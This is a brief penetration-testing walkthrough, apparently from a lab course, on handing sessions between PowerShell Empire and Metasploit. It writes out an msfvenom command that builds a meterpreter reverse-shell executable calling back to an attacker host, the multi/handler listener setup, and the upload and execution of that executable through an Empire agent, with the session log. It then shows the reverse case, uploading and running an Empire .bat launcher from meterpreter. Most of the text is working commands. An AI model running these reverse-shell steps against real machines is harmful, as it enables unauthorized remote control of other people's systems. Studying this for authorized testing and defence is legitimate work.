***
In PowerShell Empire version 2.4, it was possible to use a meterpreter listener
and the injectshellcode module to inject a meterpreter shellcode directly in
memory from PowerShell. However, in the newest version (2.5) this code is
unfortunately broken.
***

If a PowerShell Empire agent is active on the host, we can use msfvenom to generate a meterpreter reverse shell as an executable:
Kali>
`msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -
f exe -o met.exe`

We then set up a Metasploit listener using the multi/handler module and the previously-chosen settings:
`use multi/handler`

Set options and execute.

Now we switch back to our PowerShell Empire shell and upload the executable:
Empire: S2y5xw1L) >
`upload /home/kali/met.exe`
`shell dir`

Execute meterpeter executable:
`shell C:\Users\offsec.corp\Downloads>met.exe`

With the executable running, we’ll switch back to our meterpreter listener and watch the incoming shell:
```
[*] Started HTTP reverse handler on http://10.11.0.4:7777
[*] http://10.11.0.4:7777 handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 1 opened (10.11.0.4:7777 -> 10.11.0.22:50597)

meterpreter>
```

Reversing this process to connect to an Empire agent from an existing meterpreter session is also simple. We can create a launcher (.bat format) and use meterpreter to upload and execute it. First we’ll create the launcher using Empire:
(Empire: listeners) > 
`usestager windows/launcher_bat`
`set Listener http`
`execute`

Then we can upload and execute it:
meterpreter > 
`upload /tmp/launcher.bat`
`shell`
`dir`
`C:\Users\offsec.corp\Downloads>launcher.bat`